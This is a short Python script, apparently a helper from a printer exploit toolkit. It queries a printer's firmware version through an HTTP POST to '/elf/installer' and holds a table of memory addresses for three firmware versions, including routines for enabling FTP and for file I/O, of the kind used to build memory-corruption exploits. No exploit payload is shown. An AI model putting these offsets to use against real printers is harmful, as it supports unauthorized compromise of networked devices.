#!/usr/bin/env python3
import json
import argparse
import http.client
import urllib.parse


LATEST_VERSION = "10.03"

ADDRESS_MAPPING = {
    "9.01": {
        "bjnp_struct": 0x46F2AFF4,
        "ntpv_procRegister": 0x40DEEB08,
        "enable_ftpd": 0x4185EC0C,
        "ftpd_cd": 0x4185E2A4,
        "set_energy_save": 0x413053BC,
        "sleep": 0x41738210,
        "open": 0x41690EB0,
        "read": 0x41691108,
        "close": 0x41690F60,
        "image_buffer": 0x436A2CBC,
        "display_frame_buffer": 0x4130503C,
    },
    "10.02": {
        "bjnp_struct": 0x46F2B294,
        "ntpv_procRegister": 0x40DEEBA0,
        "enable_ftpd": 0x4185F664,
        "ftpd_cd": 0x4185ECFC,
        "set_energy_save": 0x413054D8,
        "sleep": 0x0,
        "open": 0x416917C8,
        "read": 0x41691A20,
        "close": 0x41691878,
        "image_buffer": 0x436A3F64,
        "display_frame_buffer": 0x41305158,
    },
    "10.03": {
        "bjnp_struct": 0x46F2B514,
        "ntpv_procRegister": 0x40DEEBA0,
        "enable_ftpd": 0x4185F91C,
        "ftpd_cd": 0x4185EFB4,
        "set_energy_save": 0x41305528,
        "sleep": 0x0,
        "open": 0x41691A80,
        "read": 0x41691CD8,
        "close": 0x41691B30,
        "image_buffer": 0x436A4254,
        "display_frame_buffer": 0x413051A8,
    },
}


def get_version(target, debug=False):
    data = json.dumps({"commandName": "echo"})
    conn = http.client.HTTPConnection(target, 80)
    conn.request("POST", "/elf/installer", data)

    res = conn.getresponse()
    data = res.read()

    if debug:
        print("\n--\n")
        print(res.status, res.reason)
        print(data)

    info = json.loads(data.decode("utf-8"))
    replyParam = next(filter(lambda d: "replyParam" in d, info["reply"]), {})
    replyParam = replyParam.get("replyParam", [])
    resultInfo = next(filter(lambda d: "version" in d, replyParam), None)
    version = resultInfo.get("version", None)

    if not version:
        print("Version not found, assuming latest:", LATEST_VERSION)
        version = LATEST_VERSION

    return version


def get_address_dict(version):
    assert version in ADDRESS_MAPPING, ValueError("Unknown printer version")
    return ADDRESS_MAPPING[version]


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="Printer IP", default="172.16.71.1")
    parser.add_argument("-d", "--debug", help="Debug mode", action="store_true", default=False)
    args = parser.parse_args()
    print("Printer version:", get_version(args.target, args.debug))
